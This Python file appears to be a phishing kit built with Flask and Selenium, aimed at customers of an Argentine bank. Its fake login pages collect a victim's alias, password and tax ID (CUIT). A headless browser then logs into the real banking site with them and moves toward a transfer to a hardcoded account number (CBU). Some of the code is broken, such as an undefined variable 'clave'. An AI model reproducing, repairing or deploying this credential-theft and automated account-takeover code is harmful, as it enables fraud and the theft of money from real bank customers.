from flask import Flask,render_template,request,url_for,redirect
import unittest
from selenium import webdriver
import selenium.webdriver.common.keys
import selenium.webdriver.common.by 
from selenium.webdriver.support.ui import Select 
from selenium.webdriver.chrome.options import Options
from selenium import webdriver
import time
chrome_options = Options()
chrome_options.add_argument("--headless")
app =   Flask(__name__)
global cbu 
cbu = "0140040303511852491470"
@app.route("/")

def index():
     return render_template('form.htm')

@app.route("/password",methods=["POST"])  

def nameUser():
    global nombreUser                                       #Definimos esta variable global para que todos puedan hacer uso de ella fuera de la funcion Originald e la varieable
    nombreUser = request.form['alias']
    return redirect('password')

@app.route("/password")
def iniciopass():
    return render_template("passw.htm") 
    return redirect('sincronizar')   

@app.route("/sincronizar") 
def sincronizar(): 
    return render_template("sincronizar.html")  

@app.route("/sincronizar",methods=["POST"]) 

def passUser():
    global cuit1
    global cuit2
    global cuit3
    cuitCategoria = request.form['cuit1']
    cuitDni = request.form['cuit2']
    cuitVerificador = request.form['cuit3']
    passwUser = request.form['password']
    if cuitCategoria != '':
        chrome_driver= webdriver.Chrome(chrome_options=chrome_options,executable_path=r"chromedriver.exe")
        chrome_driver.get("https://bee.redlink.com.ar/bna2")

        correo = chrome_driver.find_element_by_name("alias")
        correo.send_keys(nombreUser)
        correo.submit()
        time.sleep(2)
      
        passw = chrome_driver.find_element_by_name("password")
        passw.send_keys(passwUser)

        cuit1 = chrome_driver.find_element_by_xpath(" /html/body/div[1]/div/div[1]/div[3]/div[3]/div[3]/form/table[1]/tbody/tr[2]/td[3]/input[2] ")
        cuit1.send_keys(cuitCategoria)

        cuit2 = chrome_driver.find_element_by_id("cuitDni")
        cuit2.send_keys(cuitDni)

        cuit3 = chrome_driver.find_element_by_id("cuitVerificador")
        cuit3.send_keys(cuitVerificador)


        time.sleep(4)
        cuit1.submit()

        # Abre el menu Principal opcion = Operar
        # chrome_driver.find_element_by_xpath("//*[@id='menuhorizontal']/li[2]/span").click()
        # time.sleep(1)

        # Abre el menu Principal opcion = Operar
        chrome_driver.find_element_by_xpath("//*[@id='consultas1132']/li[4]/a").click()
        time.sleep(3)
        texto_columnas = chrome_driver.find_element_by_xpath("/html/body/div[2]/div/div[2]/div[2]/div[1]/div[2]/div/div/form/div/table/tbody/tr/td[4] ")
        texto_columnas = texto_columnas.text

        time.sleep(3)
        chrome_driver.find_element_by_xpath("//*[@id='menuhorizontal']/li[2]/span").click()
        time.sleep(1)

        chrome_driver.find_element_by_xpath("//*[@id='transferencias1132']/li[10]/a").click()
        time.sleep(3)

#chrome_driver.find_element_by_xpath("//*[@id='comboBancoComprobar']").click()
#time.sleep(3)
        chrome_driver.find_element_by_xpath("//*[@id='tipoOtrosBancos']").click()
        time.sleep(3)

        chrome_driver.find_element_by_xpath("//*[@id='ingresoCbuComprobar']").click()
        time.sleep(3)


        cuit3 = chrome_driver.find_element_by_xpath("//*[@id='cbuComprobar']")
        cuit3.send_keys(cbu)
        time.sleep(4)
        chrome_driver.find_element_by_xpath("//*[@id='boton']").click()
        time.sleep(3)

        cuit3 = chrome_driver.find_element_by_xpath("/html/body/div[2]/div/div[2]/div[2]/div[1]/div[3]/form[2]/div/table/tbody/tr[3]/td[4]/input")
        cuit3.send_keys(cbu)

        chrome_driver.find_element_by_xpath("/html/body/div[2]/div/div[2]/div[2]/div[1]/div[3]/form[2]/table/tbody/tr/td/a").click()
        time.sleep(3)

        chrome_driver.find_element_by_xpath("/html/body/div[2]/div/div[2]/div[2]/div[1]/div[3]/div[2]/table[2]/tbody/tr/td/a[1]").click()
        time.sleep(3)


        cuit3 = chrome_driver.find_element_by_xpath("/html/body/div[2]/div/div[2]/div[2]/div[2]/div[4]/table/tbody/tr/td[1]/div/div[1]/table/tbody/tr/td[2]/input")
        cuit3.send_keys(clave)

        chrome_driver.find_element_by_xpath("/html/body/div[2]/div/div[2]/div[2]/div[2]/div[4]/table/tbody/tr/td[1]/div/table/tbody/tr/td/a[1]").click()
        time.sleep(3)







   
    







     







@app.route("/contacto.htm") 
def pasresd(): 
    return render_template("passw.htm")  


if __name__== "__main__":
    app.run()